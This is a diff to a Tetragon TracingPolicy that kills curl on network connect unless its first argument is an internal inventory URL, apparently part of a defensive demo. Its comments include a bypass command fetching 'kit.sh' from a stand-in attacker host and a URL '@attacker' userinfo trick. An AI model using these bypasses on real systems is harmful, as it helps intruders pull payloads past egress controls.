@@ -1,23 +1,5 @@
-# Layer 2: tool download  (uses matchCmdArgs, new in Tetragon 1.8)
-#
-# What it does:  kills curl when it tries to open a network connection,
-#                unless its first argument is the internal inventory URL.
-# Why not just ban curl: the app itself runs
-#                  curl http://inventory.demo.svc.cluster.local:8080/health ...
-#                on every /status request. Banning curl would break the app.
-# How:           a kprobe on security_socket_connect, filtered by
-#                - matchBinaries: only /usr/bin/curl
-#                - matchCmdArgs:  argv[1] (index 0) must NOT start with the
-#                                 inventory URL for the selector to match
-#
-# Known bypass (shown on purpose in Act 4 of the demo):
-#   curl http://inventory.../health http://attacker/kit.sh
-#   matchCmdArgs checks one argument at a fixed index, and curl fetches every
-#   URL it is given. Argument filters narrow the blast radius; they are not a
-#   replacement for the execution-layer policy (03-block-shell.yaml).
-#
-# Ships in monitor mode. Switch to enforce with:
-#   scripts/policy.sh enforce block-curl-download
+# Layer 2: kill curl when it connects, unless its first argument is the
+# inventory URL (the app's own /status call). Bypassable on purpose: see Act 4.
 apiVersion: cilium.io/v1alpha1
 kind: TracingPolicyNamespaced
 metadata:
@@ -47,8 +29,7 @@ spec:
             - index: 0
               operator: NotPrefix
               values:
-                # The trailing slash matters: without it,
-                # http://inventory.demo.svc.cluster.local:8080@attacker/ would pass.
+                # The trailing slash stops ...:8080@attacker/ from passing.
                 - "http://inventory.demo.svc.cluster.local:8080/"
           matchActions:
             - action: Sigkill
